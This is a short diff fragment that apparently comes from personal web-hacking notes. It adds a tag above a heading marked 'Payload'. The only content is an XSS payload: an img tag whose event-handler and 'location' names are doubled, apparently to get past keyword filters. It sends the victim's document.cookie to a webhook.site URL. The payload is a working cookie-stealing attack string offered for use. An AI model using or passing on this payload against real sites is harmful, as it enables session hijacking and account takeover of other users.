@@ -1,3 +1,4 @@
+#web-hacking 
 # Payload
 ```text
 <img src=x oonnerror="locatioonn.href=('https://webhook.site/9c575756-4179-4461-8db6-cbf276d1e0d6?cookie='+document.cookie);">
